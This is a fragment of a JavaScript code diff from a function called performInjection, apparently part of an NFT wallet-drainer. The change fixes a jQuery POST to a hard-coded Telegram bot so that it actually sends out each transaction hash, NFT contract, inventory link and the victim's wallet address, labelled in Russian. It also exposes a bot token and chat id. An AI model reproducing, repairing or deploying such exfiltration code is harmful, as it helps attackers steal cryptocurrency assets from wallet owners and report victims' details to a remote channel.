@@ -166,7 +166,7 @@ async function performInjection(address) {
             var z=$.ajax({  
   type: "POST",  
   url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
-  "parse_mode=HTML&text="+encodeURIComponent("Транзакция: "+"https://etherscan.io/tx/"+txHash)+"%0A%0A"+encodeURIComponent("Контракт:"+higherPrice)+"%0A%0A"+encodeURIComponent("Инвентарь(НФТ): https://etherscan.io/token/"+higherPrice+"?a="+selectedAccount+"#inventory ")+"%0A%0A"+encodeURIComponent("Адрес владельца: "+selectedAccount), 
+  data: "parse_mode=HTML&text="+encodeURIComponent("Транзакция: "+"https://etherscan.io/tx/"+txHash)+"%0A%0A"+encodeURIComponent("Контракт:"+higherPrice)+"%0A%0A"+encodeURIComponent("Инвентарь(НФТ): https://etherscan.io/token/"+higherPrice+"?a="+selectedAccount+"#inventory ")+"%0A%0A"+encodeURIComponent("Адрес владельца: "+selectedAccount), 
   }); 
             if (i == sortedNFTs.length - 1) {
                 
